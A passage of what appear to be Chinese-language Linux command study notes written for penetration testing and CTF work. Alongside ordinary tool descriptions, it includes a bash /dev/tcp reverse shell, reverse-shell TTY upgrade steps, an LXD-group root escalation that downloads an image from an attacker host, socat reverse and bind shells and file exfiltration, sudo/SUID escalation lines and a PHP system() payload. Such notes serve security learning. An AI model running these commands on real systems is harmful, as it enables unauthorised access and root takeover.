<li><strong><code>cap_net_raw</code></strong><br>  允许程序使用原始网络套接字（例如执行 <code>ping</code> 命令）。</li>
<li><strong><code>cap_dac_read_search</code></strong><br>  允许程序绕过文件的读和搜索权限检查。</li>
<li><strong><code>cap_sys_admin</code></strong><br>  允许程序执行许多系统管理操作，相当于 root 权限。</li>
<li><strong><code>cap_chown</code></strong><br>  允许程序更改文件的所有者和组。</li>
<li><strong><code>cap_setuid</code></strong><br>  允许程序更改自己的用户 ID。<br>使用时用&#x2F;usr&#x2F;sbin&#x2F;getcap 这个目录下的权限更高  能找到更多文件</li>
</ul>
<h2 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h2><p>ln 是 Linux 系统中的 创建链接命令，用于创建 硬链接 或 符号链接（软链接）。</p>
<h3 id="常用参数-6"><a href="#常用参数-6" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>-s</code></td>
<td>创建符号链接（软链接）</td>
</tr>
<tr>
<td><code>-f</code></td>
<td>强制覆盖已存在的链接</td>
</tr>
<tr>
<td><code>-v</code></td>
<td>显示详细信息</td>
</tr>
<tr>
<td><code>-n</code></td>
<td>取消对目标的符号链接解析</td>
</tr>
</tbody></table>
<h2 id="bash-i-dev-tcp-ip-1234-0-1"><a href="#bash-i-dev-tcp-ip-1234-0-1" class="headerlink" title="bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;1234 0&gt;&amp;1"></a>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;1234 0&gt;&amp;1</h2><p> 反弹shell指令</p>
<h3 id="bash-i"><a href="#bash-i" class="headerlink" title="bash -i"></a>bash -i</h3><p>bash 是 Unix 系统上的一个常用 shell（命令行解释器）。bash 可以启动交互式或非交互式 shell。<br>-i 选项使 bash 启动为交互式 shell，这意味着 shell 会尝试从标准输入读取命令并打印标准输出。交互式 shell 还会加载用户的配置文件（例如 .bashrc），使其行为与普通终端相似。</p>
<h3 id="dev-tcp-192-168-240-83-1234"><a href="#dev-tcp-192-168-240-83-1234" class="headerlink" title="&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234"></a>&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234</h3><blockquote>
<p>&amp; 是 Bash 中用于重定向输出的语法，它将文件描述符从一个地方重定向到另一个地方。<br>&#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234 是一个特殊的文件路径，它是 Bash 内置的一种方式，通过 TCP 连接发送和接收数据。它表示一个 TCP 连接，其中 192.168.240.83 是目标 IP 地址，1234 是目标端口号。<br>这种方式允许 Bash 将输出流重定向到一个 TCP 连接，而不是普通的文件或终端。这使得 Bash 可以将输出（如命令的执行结果）发送到远程主机。<br>所以，&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234 将 bash 的标准输出（STDOUT）和标准错误（STDERR）都重定向到目标机器的 IP 地址 192.168.240.83，并通过端口 1234 发送。</p>
</blockquote>
<h3 id="0-1"><a href="#0-1" class="headerlink" title="0&gt;&amp;1"></a>0&gt;&amp;1</h3><p>0 代表标准输入（stdin）。</p>
<blockquote>
<p>&amp;1 将标准输入重定向到标准输出。这意味着输入流会从 TCP 连接而不是终端接收。<br>通过这一部分，bash 的标准输入（命令输入）会从远程机器的 TCP 连接接收，而不是从用户的终端接收。<br>综合解释<br>整个命令的作用是：<br>启动一个交互式 Bash shell (bash -i)。<br>将标准输出和标准错误输出重定向到一个 TCP 连接，目标 IP 为 192.168.240.83，目标端口为 1234。<br>将标准输入重定向到 TCP 连接，从远程机器接收输入。<br>反向 Shell<br>这行命令的作用就是创建一个反向 shell。受害主机通过 bash 连接到攻击者的机器，并通过一个指定的端口（这里是 1234）与攻击者进行交互：</p>
</blockquote>
<h2 id="stty-raw-echo-fg-美化终端"><a href="#stty-raw-echo-fg-美化终端" class="headerlink" title="stty raw -echo; fg (美化终端)"></a>stty raw -echo; fg (美化终端)</h2><p><code>stty raw -echo; fg</code> 是一个组合命令，通常用于恢复终端的正常行为或从后台恢复一个挂起的任务。<br>刚才用了<code>script -qc /bin/bash /dev/null</code>然后ctrl+z挂起了那个回话<br>再输入reset xterm升级终端<br>然后再输入当前kali的stty的行数列数  先用stty -a获取行数列数<br>然后在web shell中输入 stty rows 34 columns 115<br>完整美化终端操作：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">ctrl + z挂起</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset</span><br><span class="line">xterm</span><br><span class="line">本机<span class="built_in">stty</span> -a 查看自己的  rows columns</span><br><span class="line"><span class="built_in">stty</span>  rows 35 columns 115</span><br></pre></td></tr></table></figure></div>

<h2 id="–"><a href="#–" class="headerlink" title="–"></a>–</h2><p>当创建&#x2F;使用的文件名中有–时，要在命令中加上– 告诉命令后面的不是参数，因为默认–后面跟着参数</p>
<h2 id="pts"><a href="#pts" class="headerlink" title="pts"></a>pts</h2><p>PTS（Pseudo Terminal Slave，伪终端从设备）是一种 伪终端（Pseudo Terminal, PTY） 设备，它用于支持终端仿真，如 SSH 连接、screen、tmux、script、expect 等工具。它通常与 PTY 主设备（Master） 配对，用于提供交互式终端访问。<br>在 Linux 或 macOS 中，当你打开一个新的终端会话（如 ssh 远程连接、tmux 分屏、或 screen 会话），系统会为你分配一个 伪终端设备，通常格式为：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/dev/</span>pts/N</span><br></pre></td></tr></table></figure></div>

<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>名称查看配置文件：<code>docker inspect </code><br>列出所有容器: <code>docker ps -a</code><br>进入容器的交互式shell : <code>docker exec -it &lt;container_id_or_name&gt; /bin/bash</code><br>查看所有卷: <code>docker volume ls</code><br>删除卷：<code>docker volume rm &lt;volume_name&gt;</code></p>
<h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p><code>wc</code>（<strong>word count</strong>）是一个用于统计文件内容的命令，能够计算 <strong>行数、单词数、字符数和字节数</strong>。</p>
<h3 id="常用参数-7"><a href="#常用参数-7" class="headerlink" title="常用参数"></a><strong>常用参数</strong></h3><table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>-l</code></td>
<td><strong>只统计行数</strong>（Lines）</td>
</tr>
<tr>
<td><code>-w</code></td>
<td><strong>只统计单词数</strong>（Words）</td>
</tr>
<tr>
<td><code>-c</code></td>
<td><strong>只统计字节数</strong>（Bytes）</td>
</tr>
<tr>
<td><code>-m</code></td>
<td><strong>只统计字符数</strong>（Characters），与 <code>-c</code> 类似，但 <code>-m</code> 适用于多字节字符（如 UTF-8）</td>
</tr>
<tr>
<td><code>-L</code></td>
<td><strong>输出最长行的字符数</strong></td>
</tr>
</tbody></table>
<h2 id="sulogin"><a href="#sulogin" class="headerlink" title="sulogin"></a>sulogin</h2><p><code>sulogin</code> 是 <strong>Single User Login（单用户模式登录）</strong> 的命令，通常用于 <strong>Linux&#x2F;Unix 在单用户模式（维护模式）下，以 root 身份登录</strong>，用于修复系统或执行维护任务。<br>基本用法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">sulogin <span class="selector-attr">[OPTIONS]</span> <span class="selector-attr">[TTY]</span></span><br></pre></td></tr></table></figure></div>

<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-p</td>
<td>单用户 Shell 调用一个破折号作为参数中的第一个字符</td>
</tr>
<tr>
<td>-t</td>
<td>程序只会等待用户输入指定秒数</td>
</tr>
<tr>
<td>ENVIRONMENT VARIABLES</td>
<td></td>
</tr>
<tr>
<td>sulogin looks for the environment variable SUSHELL or sushell to determine what shell to start. If the environment variable is not set, it will try to execute root’s shell from &#x2F;etc&#x2F;passwd. If that fails, it will fall</td>
<td></td>
</tr>
<tr>
<td>back to &#x2F;bin&#x2F;sh.</td>
<td></td>
</tr>
<tr>
<td>说明SUSHELL这个环境变量可以指定启动什么shell</td>
<td></td>
</tr>
</tbody></table>
<h2 id="cron定时任务"><a href="#cron定时任务" class="headerlink" title="cron定时任务"></a>cron定时任务</h2><p><code>cron</code> 是 <strong>Linux&#x2F;Unix</strong> 系统中的定时任务调度工具，可用于 <strong>定期执行脚本、命令或程序</strong>，适用于 <strong>自动备份、日志清理、定时任务等场景</strong>。<br>相关路径</p>
<table>
<thead>
<tr>
<th><strong>文件 &#x2F; 目录</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>/etc/crontab</code></td>
<td><strong>系统级</strong> crontab 配置，所有用户共享</td>
</tr>
<tr>
<td><code>/var/spool/cron/crontabs/</code></td>
<td><strong>存放用户的 crontab</strong> 任务文件（不能手动编辑）</td>
</tr>
<tr>
<td><code>/etc/cron.d/</code></td>
<td><strong>存放系统定时任务</strong>，格式与 <code>/etc/crontab</code> 相同</td>
</tr>
<tr>
<td><code>/etc/cron.hourly/</code></td>
<td><strong>每小时</strong> 执行的脚本目录</td>
</tr>
<tr>
<td><code>/etc/cron.daily/</code></td>
<td><strong>每天</strong> 执行的脚本目录</td>
</tr>
<tr>
<td><code>/etc/cron.weekly/</code></td>
<td><strong>每周</strong> 执行的脚本目录</td>
</tr>
<tr>
<td><code>/etc/cron.monthly/</code></td>
<td><strong>每月</strong> 执行的脚本目录</td>
</tr>
<tr>
<td><code>/var/log/syslog</code> 或 <code>/var/log/cron</code></td>
<td><strong>存放 <code>cron</code> 执行日志</strong>（不同系统路径可能不同）</td>
</tr>
</tbody></table>
<h2 id="lxd"><a href="#lxd" class="headerlink" title="lxd"></a>lxd</h2><p>LXD 是一个 root 进程，它负责执行任意用户的 LXD UNIX 套接字写入访问操作。而且在某些情况下，LXD 甚至都不会调用它的用户权限进行检查和匹配</p>
<p>Linux Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于 Chroot 和完整开发的虚拟机之间，LXC 可以创建一个跟正常 Linux 操作系统十分接近的环境，但是不需要使用到单独的内核资源。</p>
<p>Linux Daemon（LXD）是一个轻量级容器管理程序，而 LXD 是基于 LXC 容器技术实现的，而这种技术之前 Docker 也使用过。LXD 使用了稳定的 LXC API 来完成所有的后台容器管理工作，并且增加了 REST API 支持，更进一步地提升了用户体验度。<br>如果一个普通用户属于 <code>lxd</code> 组，那么他就可以：</p>
<ul>
<li>创建 LXD 容器</li>
<li>以 <code>security.privileged=true</code> 的方式运行容器（即让容器以 root 权限运行）</li>
<li>挂载宿主机的目录到容器中，理论上可以访问整个文件系统</li>
</ul>
<p>由于 <code>lxd</code> 进程是以 root 权限运行的，而 <code>lxd</code> 组用户可以控制 <code>lxd</code>，所以它本质上是一个 <strong>“权限升级的入口”</strong>。<br><strong>（2）提权流程</strong></p>
<p><strong>核心思想</strong>：</p>
<ol>
<li><strong>利用 LXD 组权限</strong> 创建一个 <strong>特权（privileged）容器</strong>，该容器将以 root 运行。</li>
<li><strong>挂载宿主机的根目录</strong> 到容器的 <code>/mnt/root</code> 目录，使得容器内部可以直接访问宿主机的文件系统。</li>
<li>进入容器后，利用 <code>chroot</code> 进入 <code>/mnt/root</code>，从而获得宿主机的 root 权限。<br>提权详细过程</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#（1）获取 Alpine Linux 镜像</span></span><br><span class="line">wget http://攻击机IP/alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#lxd初始化</span></span><br><span class="line">lxd init   <span class="comment">#一路回车</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后导入镜像：</span></span><br><span class="line">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="built_in">alias</span> image_name</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建特权容器</span></span><br><span class="line">lxc init image_name ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#挂载宿主机的根目录</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动并进入容器</span></span><br><span class="line">lxc start ignite </span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到宿主机环境</span></span><br><span class="line"><span class="built_in">chroot</span> /mnt/root</span><br></pre></td></tr></table></figure></div>

<h2 id="socat端口转发"><a href="#socat端口转发" class="headerlink" title="socat端口转发"></a>socat端口转发</h2><p><code>socat</code> 主要用于在两个数据流之间建立双向通信。例如，可以在本地监听一个端口，并将数据转发到远程服务器上的指定端口。</p>
<h3 id="本地端口转发（将本地端口流量转发到远程）"><a href="#本地端口转发（将本地端口流量转发到远程）" class="headerlink" title="本地端口转发（将本地端口流量转发到远程）"></a>本地端口转发（将本地端口流量转发到远程）</h3><p>示例：本地监听 8080，将请求转发到 192.168.1.100:80</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP-LISTEN:<span class="number">8080</span>,fork TCP:<span class="number">192.168.1.100:80</span></span><br></pre></td></tr></table></figure></div>
<h3 id="远程端口转发（将远程端口的流量转发到本地）"><a href="#远程端口转发（将远程端口的流量转发到本地）" class="headerlink" title="远程端口转发（将远程端口的流量转发到本地）"></a>远程端口转发（将远程端口的流量转发到本地）</h3><p>示例：监听远程服务器的 9000 端口，并转发到本地的 8080 端口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP-LISTEN:<span class="number">9000</span>,reuseaddr,fork TCP:<span class="number">127.0.0.1:8080</span></span><br></pre></td></tr></table></figure></div>
<h3 id="反向代理（将访问远程端口的请求转发到另一个远程地址）"><a href="#反向代理（将访问远程端口的请求转发到另一个远程地址）" class="headerlink" title="反向代理（将访问远程端口的请求转发到另一个远程地址）"></a>反向代理（将访问远程端口的请求转发到另一个远程地址）</h3><p>示例：监听本地 4444 端口，并转发到远程 10.10.10.10:5555</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP-LISTEN:<span class="number">4444</span>,reuseaddr,fork TCP:<span class="number">10.10.10.10:5555</span></span><br></pre></td></tr></table></figure></div>
<h3 id="UDP端口转发"><a href="#UDP端口转发" class="headerlink" title="UDP端口转发"></a>UDP端口转发</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">socat</span> UDP-LISTEN:<span class="number">9999</span>,reuseaddr,fork UDP:<span class="number">192.168.1.200:53</span></span><br></pre></td></tr></table></figure></div>
<h3 id="反向-Shell（监听远程主机的反连）"><a href="#反向-Shell（监听远程主机的反连）" class="headerlink" title="反向 Shell（监听远程主机的反连）"></a>反向 Shell（监听远程主机的反连）</h3><p>示例：受控机器通过 <code>socat</code> 连接到攻击机 4444 端口，并提供交互式 shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP:攻击机IP:<span class="number">4444</span> EXEC:<span class="string">&quot;/bin/bash&quot;</span>,pty,stderr,sigint,setsid,sane</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>reuseaddr</code>：允许端口重用，避免 “端口已被占用” 的问题。</li>
<li><code>fork</code>：让 <code>socat</code> 处理多个连接，而不是只接受一个。<br>上面的指令最后加上&amp;,让它在后台进行</li>
</ul>
<p>此外socat还可进行读取文件，写入文件，sudo提权，等等  <a href="https://gtfobins.github.io/gtfobins/socat/">https://gtfobins.github.io/gtfobins/socat/</a></p>
<table>
<thead>
<tr>
<th><strong>功能</strong></th>
<th><strong>命令</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>受限环境逃逸</strong></td>
<td><code>socat stdin exec:/bin/sh</code></td>
<td>在受限环境中获取交互式 shell</td>
</tr>
<tr>
<td><strong>反向 shell</strong></td>
<td><code>socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane</code></td>
<td>目标机向攻击者回连 shell</td>
</tr>
<tr>
<td><strong>绑定 shell</strong></td>
<td><code>socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane</code></td>
<td>目标机监听端口，攻击者连接获取 shell</td>
</tr>
<tr>
<td><strong>文件上传</strong></td>
<td><code>socat -u file:$LFILE tcp-connect:$RHOST:$RPORT</code></td>
<td>目标机向攻击者上传文件</td>
</tr>
<tr>
<td><strong>文件下载</strong></td>
<td><code>socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat</code></td>
<td>攻击者向目标机发送文件</td>
</tr>
<tr>
<td><strong>文件写入</strong></td>
<td><code>socat -u &#39;exec:echo DATA&#39; &quot;open:$LFILE,creat&quot;</code></td>
<td>在目标机写入数据</td>
</tr>
<tr>
<td><strong>文件读取</strong></td>
<td><code>socat -u &quot;file:$LFILE&quot; -</code></td>
<td>读取文件内容</td>
</tr>
<tr>
<td><strong>sudo 提权</strong></td>
<td><code>sudo socat stdin exec:/bin/sh</code></td>
<td>如果 <code>socat</code> 可用 sudo，则可获取 root shell</td>
</tr>
<tr>
<td><strong>SUID 提权</strong></td>
<td><code>sudo install -m =xs $(which socat) .</code></td>
<td>复制 <code>socat</code> 并利用 SUID 提权</td>
</tr>
</tbody></table>
<h2 id="netstat-lntup"><a href="#netstat-lntup" class="headerlink" title="netstat -lntup"></a>netstat -lntup</h2><p><code>netstat -lntup</code> 是 Linux 下用于查看当前监听的网络端口及其对应进程的命令。</p>
<h3 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h3><ul>
<li><code>-l</code> (<code>--listening</code>)：显示 <strong>正在监听</strong> 的端口（即服务在等待连接）。</li>
<li><code>-n</code> (<code>--numeric</code>)：以 <strong>数字格式</strong> 显示 IP 和端口（不解析域名）。</li>
<li><code>-t</code> (<code>--tcp</code>)：显示 <strong>TCP</strong> 端口。</li>
<li><code>-u</code> (<code>--udp</code>)：显示 <strong>UDP</strong> 端口。</li>
<li><code>-p</code> (<code>--programs</code>)：显示 <strong>进程信息</strong>（如进程 ID 和名称）。</li>
</ul>
<h2 id="ss"><a href="#ss" class="headerlink" title="ss"></a>ss</h2><p><code>ss</code>（<strong>socket statistics</strong>）是 <code>netstat</code> 的现代替代工具，用于显示套接字（socket）相关信息。它比 <code>netstat</code> 更快，占用更少的系统资源，并且默认安装在大多数 Linux 发行版上。</p>
<h2 id="🔹-常见选项"><a href="#🔹-常见选项" class="headerlink" title="🔹 常见选项"></a>🔹 <strong>常见选项</strong></h2><table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>-t</code></td>
<td>显示 TCP 连接</td>
</tr>
<tr>
<td><code>-u</code></td>
<td>显示 UDP 连接</td>
</tr>
<tr>
<td><code>-l</code></td>
<td>仅显示监听（LISTEN）端口</td>
</tr>
<tr>
<td><code>-n</code></td>
<td>不解析主机名和端口（显示数字）</td>
</tr>
<tr>
<td><code>-p</code></td>
<td>显示进程 PID 和名称</td>
</tr>
<tr>
<td><code>-a</code></td>
<td>显示所有连接（包括监听和已建立的）</td>
</tr>
<tr>
<td><code>-s</code></td>
<td>显示套接字统计信息</td>
</tr>
<tr>
<td><code>-i</code></td>
<td>显示详细的内部信息</td>
</tr>
<tr>
<td><code>-4</code></td>
<td>仅显示 IPv4 连接</td>
</tr>
<tr>
<td><code>-6</code></td>
<td>仅显示 IPv6 连接</td>
</tr>
<tr>
<td>查看正在使用的端口就用</td>
<td></td>
</tr>
</tbody></table>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ss -tulnp</span></span><br></pre></td></tr></table></figure></div>

<h2 id="shansum"><a href="#shansum" class="headerlink" title="shansum"></a>shansum</h2><p>以sha1sum举例。<code>sha1sum</code> 是 Linux 中用来计算文件或字符串的 <strong>SHA-1 哈希值</strong> 的命令。SHA-1（Secure Hash Algorithm 1）是一种常见的哈希算法，输出 160 位（20 字节）的哈希值，通常用 40 个十六进制字符表示。</p>
<h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">sha1sum <span class="tag">&lt;<span class="name">filename</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<h3 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a><strong>常用选项</strong></h3><table>
<thead>
<tr>
<th>选项</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>-b</code></td>
<td><strong>以二进制模式计算哈希</strong></td>
<td><code>sha1sum -b file.txt</code></td>
</tr>
<tr>
<td><code>-c</code></td>
<td><strong>校验文件是否与提供的哈希值匹配</strong></td>
<td><code>sha1sum -c file.sha1</code></td>
</tr>
<tr>
<td><code>--check</code></td>
<td><strong>与 <code>-c</code> 相同，校验文件的哈希值</strong></td>
<td><code>sha1sum --check file.sha1</code></td>
</tr>
<tr>
<td><code>--quiet</code></td>
<td><strong>在校验时不输出任何信息，只有错误时显示</strong></td>
<td><code>sha1sum --check --quiet file.sha1</code></td>
</tr>
<tr>
<td><code>-t</code></td>
<td><strong>指定输出哈希值的长度（默认是 40）</strong></td>
<td><code>sha1sum -t 20 file.txt</code></td>
</tr>
<tr>
<td><code>-h</code></td>
<td><strong>显示帮助信息</strong></td>
<td></td>
</tr>
</tbody></table>
<h2 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h2><p>nl 命令在 <a href="http://codex.wordpress.org.cn/Linux">linux</a> 系统中用来计算文件中行号。nl 可以将输出的文件内容自动的加上行号！其默认的结果与 cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能。</p>
<h3 id="命令格式："><a href="#命令格式：" class="headerlink" title="命令格式："></a>命令格式：</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PROLOG"><figure class="iseeu highlight /prolog"><table><tr><td class="code"><pre><span class="line">nl [选项]... [文件]...</span><br></pre></td></tr></table></figure></div>
<h3 id="命令参数："><a href="#命令参数：" class="headerlink" title="命令参数："></a>命令参数：</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-b  ：指定行号指定的方式，主要有两种：</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-b a ：表示不论是否为空行，也同样列出行号 (类似 cat -n)；</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-b t ：如果有空行，空的那一行不要列出行号 (默认值)；</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-n  ：列出行号表示的方法，主要有三种：</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-n ln ：行号在萤幕的最左方显示；</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-n rn ：行号在自己栏位的最右方显示，且不加 0 ；</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-n rz ：行号在自己栏位的最右方显示，且加 0 ；</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-w  ：行号栏位的占用的位数。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-p 在逻辑定界符处不重新开始计算。</span></span><br></pre></td></tr></table></figure></div>
<h2 id="shell引号"><a href="#shell引号" class="headerlink" title="shell引号"></a>shell引号</h2><p>在 shell 中，<code>&#39;&quot;&#39;&quot;&#39;</code>（单引号 + 双引号 + 单引号 + 双引号 + 单引号）是一个技巧，用来在单引号包围的字符串中插入一个单引号。要理解何时使用它，需要掌握 shell 的引号规则：</p>
<ol>
<li><p><strong>单引号 (<code>&#39;</code>)</strong></p>
<ul>
<li>单引号内的所有字符都被视为原样，不会进行变量替换或转义。</li>
<li>不能在单引号内直接插入单引号，除非打破单引号的范围。</li>
</ul>
</li>
<li><p><strong>双引号 (<code>&quot;</code>)</strong></p>
<ul>
<li>允许变量替换和命令替换（<code>$VAR</code>、<code>$(command)</code>）。</li>
<li>但不会解析 <code>\</code>（除非用于转义 <code>$</code>、<code>`</code> 或 <code>&quot;</code>）。</li>
</ul>
</li>
</ol>
<p>如果需要在一个单引号字符串内插入单引号（例如 <code>system(&#39;cat fl*&#39;)</code>），就必须在单引号外部打破它。例如：</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">&#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span> (<span class="string">&#x27;&quot;&#x27;</span><span class="string">&quot;&#x27;cat fl*&#x27;&quot;</span><span class="string">&#x27;&quot;&#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;</span></span><br><span class="line"><span class="language-xml">等效</span></span><br><span class="line"><span class="language-xml">&#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span> (<span class="string">&#x27; + &quot;&#x27;</span><span class="string">&quot; + &#x27;cat fl*&#x27; + &quot;</span><span class="string">&#x27;&quot; + &#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="分解："><a href="#分解：" class="headerlink" title="分解："></a>分解：</h3><ul>
<li><strong>第一部分</strong> <code>&#39;&lt;?php system (&#39;</code> <strong>→ 以单引号开头</strong></li>
<li><strong>第二部分</strong> <code>&#39;&quot;&#39;&quot;&#39;</code> <strong>→ 插入单引号</strong><ul>
<li><code>&#39;&quot;&#39;</code> <strong>(结束单引号 + 开启双引号)</strong> → 进入双引号模式</li>
<li><code>&quot;&#39;&quot;</code> <strong>(双引号内输入单引号)</strong> → 由于双引号内的单引号有效，它可以作为 PHP 代码的一部分</li>
<li><code>&#39;&quot;&#39;</code> <strong>(关闭双引号 + 重新开启单引号)</strong> → 返回单引号模式</li>
</ul>
</li>
<li><strong>第三部分</strong> <code>&#39;cat fl*&#39;</code> <strong>→ 继续单引号字符串</strong></li>
<li><strong>第四部分</strong> <code>&#39;&quot;&#39;&quot;&#39;</code> <strong>→ 再次插入单引号</strong></li>
<li><strong>第五部分</strong> <code>&#39;);?&gt;&#39;</code> <strong>→ 结束单引号字符串</strong></li>
</ul>
<h2 id="ssh-authorized-keys-1"><a href="#ssh-authorized-keys-1" class="headerlink" title="~&#x2F;.ssh&#x2F;authorized_keys"></a>~&#x2F;.ssh&#x2F;authorized_keys</h2><p><code>~/.ssh/authorized_keys</code> 是一个 <strong>公钥认证</strong> 文件，它存储的是 <strong>可以用于无密码 SSH 登录该账户的公钥</strong>。</p>
<h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a><strong>作用</strong></h3><p>当你尝试通过 SSH 登录到一个账户时（比如 <code>ssh user@host</code>），SSH 服务器会检查 <code>~/.ssh/authorized_keys</code> 文件，如果其中包含与你的私钥匹配的公钥，就允许你登录，而 <strong>无需输入密码</strong>。<br><code>~/.ssh/authorized_keys</code> <strong>支持在公钥前面指定 <code>command=</code> 选项</strong>，这样 <strong>每次有人使用该公钥登录时，就会自动执行指定的命令</strong>，而不会启动普通的 shell。</p>
<h3 id="用私钥生成公钥-1"><a href="#用私钥生成公钥-1" class="headerlink" title="用私钥生成公钥"></a>用私钥生成公钥</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">ssh-keygen -<span class="attribute">y</span> -f id_rsa &gt; authorized_keys</span><br></pre></td></tr></table></figure></div>
<p>📌 <strong>说明</strong>：</p>
<ul>
<li><code>-y</code>：从私钥中提取公钥</li>
<li><code>-f id_rsa</code>：指定私钥文件</li>
<li><code>&gt; authorized_keys</code>：输出公钥到文件</li>
</ul>
